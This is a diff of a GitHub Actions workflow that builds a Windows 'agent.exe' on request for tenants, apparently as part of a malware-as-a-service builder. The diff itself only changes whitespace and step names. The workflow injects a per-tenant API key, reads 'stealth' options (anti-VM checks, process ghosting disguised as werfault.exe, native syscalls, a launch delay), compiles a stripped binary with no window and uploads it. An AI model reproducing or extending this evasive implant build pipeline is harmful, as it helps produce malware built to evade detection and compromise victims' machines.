@@ -9,7 +9,7 @@ jobs:
     steps:
       - name: Checkout Code
         uses: actions/checkout@v4
-
+      
       - name: Set up Go
         uses: actions/setup-go@v4
         with:
@@ -24,13 +24,13 @@ jobs:
         run: |
           # 1. Inject the Tenant API Key
           sed -i "s/REPLACE_ME_API_KEY/${{ github.event.client_payload.api_key }}/g" client.go
-
+          
           # 2. Extract Evasion Settings
           DELAY=${{ github.event.client_payload.stealth.delay || '0' }}
           ANTIVM=${{ github.event.client_payload.stealth.antiVM || 'false' }}
           GHOST=${{ github.event.client_payload.stealth.processGhost || 'werfault.exe' }}
           SYSCALLS=${{ github.event.client_payload.stealth.nativeSyscalls || 'true' }}
-
+          
           # 3. Standard Go Build (Default Compiler)
           GOOS=windows GOARCH=amd64 go build \
             -ldflags="-s -w -H=windowsgui \
@@ -48,7 +48,7 @@ jobs:
             -H "x-upsert: true" \
             --data-binary @agent.exe
 
-      - name: Mark build ready in Supabase
+      - name: Mark build ready
         if: success()
         run: |
           curl -fsS -X PATCH "${{ github.event.client_payload.supabase_url }}/rest/v1/build_history?build_id=eq.${{ github.event.client_payload.task_id }}" \
@@ -58,7 +58,7 @@ jobs:
             -H "Prefer: return=minimal" \
             --data "{\"status\":\"ready\",\"completed_at\":\"$(date -u +%Y-%m-%dT%H:%M:%SZ)\"}"
 
-      - name: Mark build failed in Supabase
+      - name: Mark build failed
         if: failure()
         run: |
           curl -fsS -X PATCH "${{ github.event.client_payload.supabase_url }}/rest/v1/build_history?build_id=eq.${{ github.event.client_payload.task_id }}" \
